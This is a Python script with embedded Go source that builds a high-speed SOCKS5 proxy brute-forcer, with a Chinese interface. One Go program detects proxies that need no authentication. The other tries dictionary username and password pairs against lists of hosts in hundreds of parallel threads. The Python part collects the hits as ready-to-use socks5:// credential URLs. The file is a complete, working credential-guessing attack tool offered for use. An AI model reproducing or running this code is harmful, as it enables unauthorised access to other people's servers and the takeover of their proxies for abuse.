import subprocess
import sys
import tempfile
import os
import shutil
import hashlib
import json
import time
from datetime import datetime
import getpass
import threading

# --- 依赖检查 ---
try:
    from tqdm import tqdm
    import requests
except ImportError as e:
    print(f"错误: 缺少依赖库 {e.name}。请运行: pip install tqdm requests")
    sys.exit(1)

# --- GO 核心: 协议验证器 ---
GO_SOURCE_PROTOCOL = r'''
package main
import ("bufio";"flag";"fmt";"net";"os";"strings";"sync";"time")
func verify(t string, d time.Duration, res chan<- string) {
	c, err := net.DialTimeout("tcp", t, d); if err != nil { res <- ""; return }; defer c.Close()
	c.Write([]byte{0x05, 0x01, 0x00}); r := make([]byte, 2); c.SetReadDeadline(time.Now().Add(d))
	n, err := c.Read(r); if err == nil && n == 2 && r[0] == 0x05 && r[1] == 0x00 { res <- t } else { res <- "" }
}
func main() {
	i := flag.String("i", "", ""); o := flag.String("o", "", ""); th := flag.Int("t", 100, ""); flag.Parse()
	f, _ := os.Open(*i); defer f.Close(); s := bufio.NewScanner(f); var ts []string
	for s.Scan() { if l := strings.TrimSpace(s.Text()); l != "" { ts = append(ts, l) } }
	out, _ := os.Create(*o); defer out.Close(); w := bufio.NewWriter(out)
	res := make(chan string, *th); var wg sync.WaitGroup; wg.Add(1)
	go func() { defer wg.Done(); for r := range res { if r != "" { fmt.Fprintln(w, r); w.Flush() } } }()
	var wwg sync.WaitGroup; sem := make(chan struct{}, *th)
	for _, t := range ts { wwg.Add(1); sem <- struct{}{}; go func(t string) { defer wwg.Done(); verify(t, 5*time.Second, res); <-sem }(t) }
	wwg.Wait(); close(res); wg.Wait()
}
'''

# --- GO 核心: 高性能爆破器 (Worker Pool 模式) ---
GO_SOURCE_SCANNER = r'''
package main
import ("bufio";"flag";"fmt";"net";"os";"strings";"sync";"sync/atomic";"time")
type Job struct { H, P, U, Pass string }
func check(j Job, d time.Duration) bool {
	target := net.JoinHostPort(j.H, j.P)
	c, err := net.DialTimeout("tcp", target, d); if err != nil { return false }; defer c.Close()
	c.SetDeadline(time.Now().Add(d))
	c.Write([]byte{0x05, 0x02, 0x00, 0x02}); r := make([]byte, 2); c.Read(r)
	if r[1] == 0x00 { return true } else if r[1] == 0x02 {
		req := append([]byte{0x01, byte(len(j.U))}, []byte(j.U)...)
		req = append(append(req, byte(len(j.Pass))), []byte(j.Pass)...)
		c.Write(req); ar := make([]byte, 2); c.Read(ar)
		return ar[1] == 0x00
	}
	return false
}
func main() {
	pf := flag.String("pf", "", ""); df := flag.String("df", "", ""); th := flag.Int("t", 500, ""); flag.Parse()
	pd, _ := os.ReadFile(*pf); ps := strings.Split(string(pd), "\n")
	dd, _ := os.ReadFile(*df); ds := strings.Split(string(dd), "\n")
	jobs := make(chan Job, *th * 2); var wg sync.WaitGroup; var count uint64
	for i := 0; i < *th; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done(); var lc int
			for j := range jobs {
				if check(j, 5*time.Second) { fmt.Printf("S|%s:%s|%s|%s\n", j.H, j.P, j.U, j.Pass) }
				lc++; if lc >= 50 { atomic.AddUint64(&count, 50); fmt.Println("P"); lc = 0 }
			}
		}()
	}
	for _, p := range ps {
		if t := strings.TrimSpace(p); t != "" {
			pt := strings.Split(t, ":"); if len(pt) != 2 { continue }
			for _, d := range ds {
				if dt := strings.TrimSpace(d); dt != "" {
					ct := strings.SplitN(dt, ":", 2); if len(ct) == 2 { jobs <- Job{pt[0], pt[1], ct[0], ct[1]} }
				}
			}
		}
	}
	close(jobs); wg.Wait()
}
'''

COMPILED_BINARIES = {}
CACHE_DIR = ".socks5_cache"
CONFIG_FILE = "config.json"

def load_config():
    if not os.path.exists(CONFIG_FILE): return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}
    with open(CONFIG_FILE, 'r') as f: return json.load(f)

def compile_bins():
    os.makedirs(CACHE_DIR, exist_ok=True)
    for name, src in [("verifier", GO_SOURCE_PROTOCOL), ("scanner", GO_SOURCE_SCANNER)]:
        path = os.path.join(CACHE_DIR, name)
        with open(path + ".go", "w") as f: f.write(src)
        subprocess.run(["go", "build", "-o", path, path + ".go"])
        COMPILED_BINARIES[name] = path

def finalize(raw_file, out_dir):
    if not os.path.exists(raw_file): return
    final = os.path.join(out_dir, f"Final_Socks5_{int(time.time())}.txt")
    with open(raw_file, 'r') as f, open(final, 'w') as fout:
        for line in f:
            if line.startswith("S|"):
                p = line.strip().split("|")
                fout.write(f"socks5://{p[2]}:{p[3]}@{p[1]}\n") if p[2] else fout.write(f"socks5://{p[1]}\n")
    print(f"\n[√] 结果已整合: {final}")

def run_scanner(proxy_file, dict_file, threads, out_dir):
    p_count = sum(1 for l in open(proxy_file) if l.strip())
    d_count = sum(1 for l in open(dict_file) if l.strip())
    total = p_count * d_count
    raw = os.path.join(out_dir, "raw.tmp")
    
    proc = subprocess.Popen([COMPILED_BINARIES["scanner"], "-pf", proxy_file, "-df", dict_file, "-t", threads], stdout=subprocess.PIPE, text=True)
    with tqdm(total=total, desc="扫描进度", unit="chk") as pbar:
        with open(raw, 'w') as f:
            for line in iter(proc.stdout.readline, ''):
                if line.strip() == "P": pbar.update(50)
                elif line.startswith("S|"):
                    f.write(line); f.flush()
                    tqdm.write(f"[+] 发现可用: {line.strip().split('|')[1]}")
    finalize(raw, out_dir)

def main():
    compile_bins()
    config = load_config()
    out_dir = f"session_{int(time.time())}"
    os.makedirs(out_dir, exist_ok=True)

    while True:
        print("\n--- SOCKS5 极速爆破优化版 ---")
        print("[1] 认证爆破 (Auth Scan)\n[2] 退出")
        sel = input("选择: ")
        if sel == '1':
            pf = input("代理文件 (ip:port): ")
            df = input("字典文件 (user:pass): ")
            th = input("线程 (默认500): ") or "500"
            if os.path.exists(pf) and os.path.exists(df):
                run_scanner(pf, df, th, out_dir)
        elif sel == '2': break

if __name__ == "__main__":
    main()
